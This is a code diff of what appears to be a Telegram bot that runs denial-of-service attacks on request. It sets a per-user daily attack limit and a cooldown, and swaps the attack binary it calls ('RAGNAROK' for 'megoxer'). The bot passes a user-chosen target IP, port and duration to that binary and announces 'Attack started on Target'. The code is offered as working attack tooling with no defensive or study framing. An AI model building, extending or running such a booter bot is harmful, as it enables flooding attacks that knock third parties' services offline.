@@ -18,7 +18,7 @@ GROUP_ID = "-1002258062669"
 CHANNEL_USERNAME = "@KINGCHAT7"
 
 # Default cooldown and attack limits
-COOLDOWN_TIME = 12/  # Cooldown in seconds
+COOLDOWN_TIME = 120  # Cooldown in seconds
 ATTACK_LIMIT = 20  # Max attacks per day
 
 # Files to store user data
@@ -109,7 +109,7 @@ def handle_attack(message):
         return
 
     # Execute the attack via the binary
-    full_command = f"./RAGNAROK {target} {port} {time_duration} 900"
+    full_command = f"./megoxer {target} {port} {time_duration} 900"
     try:
         bot.reply_to(message, f"Attack started on Target: {target}, Port: {port}, Time: {time_duration} seconds.\n"
                               f"Remaining attacks for you: {ATTACK_LIMIT - user['attacks'] - 1}")
